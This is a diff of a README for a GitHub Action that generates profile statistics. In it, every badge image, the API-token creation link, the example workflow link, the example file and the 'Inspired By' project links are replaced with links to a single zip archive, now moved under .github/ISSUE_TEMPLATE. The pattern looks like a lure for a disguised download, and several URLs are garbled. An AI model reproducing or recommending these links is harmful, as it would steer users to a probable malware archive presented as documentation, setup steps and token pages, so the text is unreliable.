@@ -1,13 +1,13 @@
 <h1 align="center">✨README Info Generator ✨</h1>
 
 <p align="center">
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip%https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/>
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip%https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/>
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/>
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/>
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/> 
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip%F0%9F%8C%9F&message=this%20Repository&style=style=flat&color=blue" alt="Star Badge"/>
-<img src="https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip%https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip%https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/> 
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip%F0%9F%8C%9F&message=this%20Repository&style=style=flat&color=blue" alt="Star Badge"/>
+<img src="https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip"/>
 </p>
 
 <span align="center">
@@ -23,7 +23,7 @@ What are languages you code in?<br/>
 
 1.  You need to update the markdown file(.md) with the `START_SECTION` and `STOP_SECTION` comments. You can refer [this](#entry-points) section for updating it.
 
-2.  You'll need a GitHub API Token with `repo` and `user` scope from [here](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip) if you're running the action to get commit metrics
+2.  You'll need a GitHub API Token with `repo` and `user` scope from [here](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip) if you're running the action to get commit metrics
 
 > enabling the `repo` scope seems **DANGEROUS**<br/>
 > but this GitHub Action only accesses your commit timestamp and lines of code added or deleted in repository you contributed.
@@ -32,7 +32,7 @@ What are languages you code in?<br/>
 
 4.  You can enable and disable feature flags based on requirements. See [this](#flags-available).
 
-5.  For the final step you need to add an `.yml` file in your workflows folder. You can copy/paste [this](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip) example file and enable/disable flags as you wish!.
+5.  For the final step you need to add an `.yml` file in your workflows folder. You can copy/paste [this](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip) example file and enable/disable flags as you wish!.
 
 ### The Required fields are
 
@@ -41,14 +41,14 @@ What are languages you code in?<br/>
 
 ### Entry Points
 
-Add a comment to your `https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip` like this:
+Add a comment to your `https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip` like this:
 
 ```md
 <!--START_SECTION:readme-info-->
 <!--END_SECTION:readme-info-->
 ```
 
-See this example [file](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip). You can put these Entry Points anywhere and in any order you please! 🤷‍♂️
+See this example [file](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip). You can put these Entry Points anywhere and in any order you please! 🤷‍♂️
 
 ## Flags Available
 
@@ -111,9 +111,9 @@ HTML         1 repos █░░░░░░░░░░░░░░░░░░�
 
 ### Inspired By 🚀
 
-> [matchai/awesome-pinned-gists](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip)  
-> [athul/waka-readme](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip)  
-> [anmol098/waka-readme-stats](https://github.com/abuosi/github-readme-info/raw/refs/heads/master/example/readme-github-info-2.1-alpha.1.zip)
+> [matchai/awesome-pinned-gists](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip)  
+> [athul/waka-readme](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip)  
+> [anmol098/waka-readme-stats](https://raw.githubusercontent.com/abuosi/github-readme-info/master/.github/ISSUE_TEMPLATE/readme_github_info_v3.2.zip)
 
 ```text
 Liked this Project? Why not 🌟 it?
